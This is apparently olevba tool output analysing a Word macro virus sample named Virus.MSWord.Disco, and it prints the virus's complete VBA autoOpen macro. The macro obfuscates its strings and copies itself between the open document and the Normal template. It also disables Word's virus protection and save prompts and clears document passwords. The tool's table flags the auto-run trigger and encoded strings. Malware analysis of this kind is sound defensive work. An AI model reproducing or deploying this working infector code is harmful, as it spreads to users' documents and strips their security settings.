olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Disco
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Disco - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoOpen.bas 
in file: Virus.MSWord.Disco - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub MAIN()
Dim Xanax$
Dim Klonopin$
Dim Soma$
Dim Heroin
Dim t$

    On Error GoTo -1: On Error GoTo hell
    t$ = "t" + "oo" + "l" + "s" + "m" + "a" + "c" + "r" + "o"

    Xanax$ = WordBasic.[FileName$]() + ":" + "a" + "u" + "to" + "O" + "p" + "en"
    Klonopin$ = "G" + "l" + "o" + "b" + "a" + "l:" + "a" + "u" + "to" + "O" + "p" + "en"
    
    
    Soma$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    If Soma$ = "N" + "O" + "R" + "M" + "A" + "L" + "." + "D" + "OT" Then
        Heroin = GetAttr(WordBasic.[FileName$]())
        If Heroin >= 32 Then Heroin = Heroin - 32
        If Heroin >= 4 Then Heroin = Heroin - 4
        If Heroin >= 2 Then Heroin = Heroin - 2
        If Heroin = 0 Then
        
            WordBasic.MacroCopy Klonopin$, Xanax$
            WordBasic.FileSaveAs Format:=1
            WordBasic.SetDocumentDirty 0
            
            Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:=t$, Object:= _
        wdOrganizerObjectProjectItems
            
            
            WordBasic.FileSaveAs Format:=1
            WordBasic.SetDocumentDirty 0
        End If
    Else
        WordBasic.MacroCopy Xanax$, Klonopin$
        
        Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, Destination:= _
        NormalTemplate.FullName, Name:=t$, Object:= _
        wdOrganizerObjectProjectItems
        
    End If
    
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
        .Password = ""
        .WritePassword = ""
    End With

    
GoTo fuckoff

hell:

fuckoff:
    On Error GoTo -1: On Error GoTo 0


End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

